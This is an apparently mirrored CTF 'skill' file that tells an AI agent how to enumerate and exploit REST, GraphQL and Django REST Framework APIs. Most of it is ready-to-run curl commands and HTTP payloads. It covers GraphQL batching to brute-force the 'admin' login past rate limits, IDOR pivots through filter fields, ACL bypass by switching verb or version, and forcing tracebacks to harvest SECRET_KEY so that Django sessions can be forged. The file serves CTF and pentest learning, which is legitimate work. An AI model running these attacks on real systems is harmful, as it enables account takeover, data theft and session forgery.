# API Exploitation: GraphQL, REST & Django REST Framework

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/web/api-graphql-rest.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/web/api-graphql-rest.md)

---

---
name: api-graphql-rest
category: web
triggers: [graphql, "/graphql", introspection, "__schema", swagger, openapi, "/api/", rest, "wsdl", drf, "django-rest", browsable-api, "format=json", "?format=", batching]
tools: [curl, graphql-cog, clairvoyance, graphw00f, inql, ffuf, kiterunner, arjun, jq, burpsuite]
priority: high
description: Discover and exploit REST/GraphQL APIs - introspection, batching, field suggestion, OpenAPI/Swagger discovery, and Django REST Framework weaknesses.
---
# API Exploitation: GraphQL, REST & Django REST Framework

## Trigger context
Fire on any `/graphql`, `/api/`, `/v1/`, `/swagger`, `/openapi.json`, `/api/schema/` path, JSON request/response bodies, a `DRF` browsable HTML API page, or an error mentioning `Cannot query field`. APIs expose more objects than the UI and are the fastest route to IDOR/data leak/flag.

## Objective
Enumerate the full API surface (schema, endpoints, params), then abuse authorization/logic to read privileged data or trigger unintended mutations. Deliverable = data or an action not exposed by the app UI.

## Methodology (decision tree)
1. Fingerprint. GraphQL? -> `graphw00f`. REST? -> look for Swagger/OpenAPI, WADL, or route conventions.
2. GraphQL: try introspection. Enabled -> dump whole schema (types, queries, mutations). Disabled -> field-suggestion fuzzing (Clairvoyance) + `__typename` probes.
3. GraphQL abuse: batching (brute-force/rate-limit bypass), aliasing, deep/nested query DoS, mutation authz gaps, IDOR via node IDs.
4. REST: find the spec (`/swagger.json`, `/openapi.json`, `/api-docs`, `/api/schema/`). Import to Postman/Burp; enumerate every path+verb.
5. REST fuzzing: content discovery (`ffuf`, `kiterunner`), version pivoting (`/v1`->`/v2`), verb tampering, param discovery (`arjun`).
6. Django REST Framework: check browsable API, `DEBUG=True` leaks, default `AllowAny`, filter-backend injection, `?format=json`/`.json` toggles.
7. Always retest each endpoint unauthenticated and cross-account for authz gaps.

## Commands & payloads
```bash
# --- Fingerprint & discovery ---
graphw00f -d -f -t https://target/graphql
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u https://target/api/FUZZ
kr scan https://target -w routes-large.kite            # kiterunner REST route brute
for p in swagger.json openapi.json api-docs api/schema/ v2/api-docs; do
  curl -s -o /dev/null -w "%{http_code} $p\n" "https://target/$p"; done
```
```bash
# --- GraphQL introspection dump ---
curl -s https://target/graphql -H 'Content-Type: application/json' \
  -d '{"query":"query IntrospectionQuery{__schema{types{name fields{name args{name type{name}}}}}}"}' | jq
# Field suggestion (introspection disabled): typo triggers "Did you mean" oracle
curl -s https://target/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{ usr }"}'          # -> Cannot query field "usr". Did you mean "user"?
clairvoyance -o schema.json https://target/graphql    # rebuild schema via suggestions
```
```http
### GraphQL batching (bypass login rate limits — one HTTP request, many attempts)
POST /graphql HTTP/1.1
Content-Type: application/json

[{"query":"mutation{login(user:\"admin\",pass:\"a\"){token}}"},
 {"query":"mutation{login(user:\"admin\",pass:\"b\"){token}}"},
 {"query":"mutation{login(user:\"admin\",pass:\"c\"){token}}"}]

### Alias-based batching (single operation, many resolvers)
POST /graphql
{"query":"{ a:user(id:1){email} b:user(id:2){email} c:user(id:3){email} }"}
```
```bash
# --- Django REST Framework (DRF) ---
# 1) Browsable API leaks schema/fields; content-negotiation toggles renderer:
curl -s "https://target/api/users/?format=json"        # force JSON renderer
curl -s "https://target/api/users.json"                # suffix form
curl -s -H "Accept: text/html" https://target/api/users/   # browsable HTML (field names, forms)

# 2) DEBUG=True verbose 500 page leaks settings, SECRET_KEY, SQL, paths:
curl -s "https://target/api/thing/?id[__invalid]=1"    # trigger a traceback
curl -s "https://target/nonexistent-url-xyz/"          # 404 in DEBUG lists all URL patterns

# 3) Default AllowAny — hit endpoints with NO auth header:
curl -s https://target/api/users/                      # returns data => AllowAny misconfig

# 4) DjangoFilterBackend / OrderingFilter injection & over-filtering:
curl -s "https://target/api/orders/?user=1"            # filter fields = IDOR pivot
curl -s "https://target/api/orders/?ordering=user__password"   # order/expose related fields
curl -s "https://target/api/orders/?owner__is_staff=true"      # relational filter traversal
```

```bash
# --- GraphQL endpoint locations & GET-based introspection (CSRF/WAF bypass) ---
for p in graphql graphql/console graphiql v1/graphql api/graphql graphql.php query; do
  curl -s -o /dev/null -w "%{http_code} /$p\n" "https://target/$p"; done
# Some servers accept queries over GET (bypasses POST-only filters):
curl -s "https://target/graphql?query=%7B__typename%7D"
```
```http
### REST verb / version pivoting on a locked-down route
GET  /api/v1/admin/users   -> 403
GET  /api/v2/admin/users        # older/newer version skips the ACL
POST /api/admin/users           # method the ACL forgot
PUT  /api/admin/users/1
GET  /api/internal/users        # internal path exposed publicly
```

## Branching logic
- Introspection ON -> map schema, target mutations + node-ID IDOR directly.
- Introspection OFF -> Clairvoyance/field-suggestion; if suggestions also off, brute common field names.
- Login rate-limited -> GraphQL batching/aliasing to parallelize guesses in one request.
- Swagger found -> import & fuzz every verb/path; missing spec -> `kiterunner`/wordlist discovery.
- DRF `DEBUG=True` -> harvest `SECRET_KEY` (forge Django session/signed cookies) and URL map, then pivot.
- DRF `AllowAny` on a ViewSet -> enumerate/modify objects freely; combine with `?format=json` for clean parsing.
- DRF filter backend -> treat every filterable field as an IDOR/relational-traversal lever.

## Common pitfalls
- Some GraphQL servers disable introspection but still leak via suggestions; don't stop at the first 400.
- Apollo/others cap batch size or block arrays — try aliasing instead of JSON arrays.
- `?format=json` only works if `JSONRenderer` is enabled; `.json` suffix needs `format_suffix_patterns`.
- DEBUG leaks only appear on unhandled 500s — DRF often returns clean 4xx JSON; force a real traceback.
- GraphQL errors may return `200` with an `errors` array — parse the body, not the status.
- Don't run huge nested/DoS queries against shared CTF infra; use targeted depth.

## Proof / verification
Return schema fields or an endpoint's data the UI never exposes, an unauthenticated `200` from an `AllowAny` DRF route, a `SECRET_KEY`/URL-map dump from a `DEBUG=True` traceback, or a successful batched/aliased query pulling multiple users' private fields. For flags, dump the object collection (`/api/flags/`, GraphQL `flag` type) and grep.

## Cross-references
- [sa--instructions--web--idor-access-control.md](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--idor-access-control.md) — GraphQL node IDs / DRF filter fields are IDOR primitives.
- [sa--instructions--web--auth-jwt-session.md](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--auth-jwt-session.md) — a leaked DRF `SECRET_KEY` lets you forge Django-signed session cookies/JWTs.
- [sa--instructions--web--nosql-injection.md](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--nosql-injection.md) — API params may feed a NoSQL backend directly.

## Credible sources
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql
- https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
- https://cheatsheetseries.owasp.org/cheatsheets/Django_REST_Framework_Cheat_Sheet.html
- https://www.django-rest-framework.org/api-guide/permissions/
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md
- https://owasp.org/API-Security/editions/2023/en/0x11-t10/
- https://github.com/nikitastupin/clairvoyance
